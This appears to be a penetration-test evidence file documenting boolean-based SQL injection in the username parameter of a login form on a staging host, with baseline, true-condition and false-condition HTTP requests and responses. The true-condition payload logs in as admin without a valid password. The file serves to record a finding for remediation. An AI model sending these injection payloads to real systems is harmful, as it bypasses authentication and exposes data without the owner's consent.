# Evidence Artifact: Manual request/response for SQL injection
# Finding: SQL Injection in login username parameter

=== BASELINE REQUEST ===
POST /login HTTP/1.1
Host: acme-staging.local
Content-Type: application/x-www-form-urlencoded

username=admin&password=test

=== BASELINE RESPONSE ===
HTTP/1.1 401 Unauthorized
Content-Type: text/html

Invalid credentials

=== TRUE CONDITION REQUEST ===
POST /login HTTP/1.1
Host: acme-staging.local
Content-Type: application/x-www-form-urlencoded

username=admin' AND 4251=4251-- -&password=test

=== TRUE CONDITION RESPONSE ===
HTTP/1.1 200 OK
Content-Type: text/html

Welcome back, admin

=== FALSE CONDITION REQUEST ===
POST /login HTTP/1.1
Host: acme-staging.local
Content-Type: application/x-www-form-urlencoded

username=admin' AND 4251=4252-- -&password=test

=== FALSE CONDITION RESPONSE ===
HTTP/1.1 401 Unauthorized
Content-Type: text/html

Invalid credentials

=== TESTER NOTE ===
Boolean condition changes response behavior, confirming injection behavior in the username parameter.
